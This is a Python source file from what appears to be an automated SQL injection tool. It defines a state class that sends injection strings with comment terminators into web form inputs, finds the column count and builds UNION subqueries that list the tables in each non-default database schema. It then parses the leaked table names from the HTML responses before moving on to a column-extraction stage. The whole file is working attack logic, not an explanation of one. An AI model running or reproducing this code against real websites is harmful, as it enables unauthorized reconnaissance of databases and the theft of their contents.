import logging

from src.injector_state.sql_injector_column_names import SQLInjectorGetColumnNames
from src.injector_state.sql_injector_state import SQLInjectorState
from src.engines.sql_injection_engine import SQLInjectionEngine
from src.scraping.parse_sql_response_from_html import parse_sql_response_from_html
from src.sql_injection_builder import SQLInjectionBuilder

class SQLInjectorGetDatabaseNames(SQLInjectorState):
    def __init__(self, sql_injector, engine, schemas) -> None:
        super().__init__(sql_injector)
        self.engine = engine
        self.schemas_to_do = [x for x in schemas if x not in self.engine.default_schemas]
        self.schemas = {x: {} for x in self.schemas_to_do}
        if len(self.schemas) == 0:
            raise Exception("No schemas to attack found")

    def next(self):
        self.sql_injector.state = SQLInjectorGetColumnNames(self.sql_injector, self.engine, self.schemas)
        return self.sql_injector.state

    def inject(self, action, input_chosen, inputs):
        for key in SQLInjectorState.injections_to_try:
            response = super().injection(action, input_chosen, inputs, key + "; -- ")
            if response is not None:
                while True:
                    tables = self.get_database_names(action, input_chosen, inputs, key, self.schemas_to_do[0])
                    if tables is not None:
                        logging.info(f"\033[0;36mSchema {self.schemas_to_do[0]} contains tables {tables}\033[0m")
                        self.schemas[self.schemas_to_do[0]] = {x: None for x in tables}
                        self.schemas_to_do.pop(0)
                        if len(self.schemas_to_do) == 0:
                            self.next().inject(action, input_chosen, inputs)
                            return True
                    else:
                        break
        return False


    def get_database_names(self, action, input_chosen, inputs, previous_str, schema):
        number_of_columns = super().get_number_of_columns(action, input_chosen, inputs, previous_str)
        if number_of_columns is None:
            return None
        else:
            sql_injection_string = SQLInjectionBuilder().add_str(previous_str).union_subquery(self.engine.tables(number_of_columns, schema)).build()
            response = super().injection(action, input_chosen, inputs, sql_injection_string)
            if response is not None:
                return [schema[1] for schema in parse_sql_response_from_html(response.text, ["table"], SQLInjectionEngine.injection_prefix, SQLInjectionEngine.injection_suffix)]
            else:
                return None